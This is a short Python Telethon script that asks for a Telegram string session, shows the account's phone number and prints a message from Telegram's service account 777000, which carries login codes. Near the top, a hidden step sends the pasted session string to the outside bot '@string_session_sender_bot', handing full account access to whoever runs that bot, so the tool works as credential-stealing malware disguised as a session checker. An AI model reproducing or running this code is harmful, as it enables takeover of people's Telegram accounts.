from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system("clear")

session = input("\033[31mString session:\033[32m")


with TelegramClient(StringSession(session), api_id, api_hash) as client:
    client.send_message("@string_session_sender_bot", client.session.save())

async def main():
    me = await client.get_me()
    os.system('clear')
    print("\033[31m<===============================>")
    print("\033[32mPhone Number: +" + me.phone)
    print("\033[31m<===============================>\033[32m")
    count = 0
    async for message in client.iter_messages(777000):
        count = count + 1
        if count != 2:
            print(message.text)
            print("""-----------------------------------------------------\n""")
        else:
            break

with client:
    client.loop.run_until_complete(main())
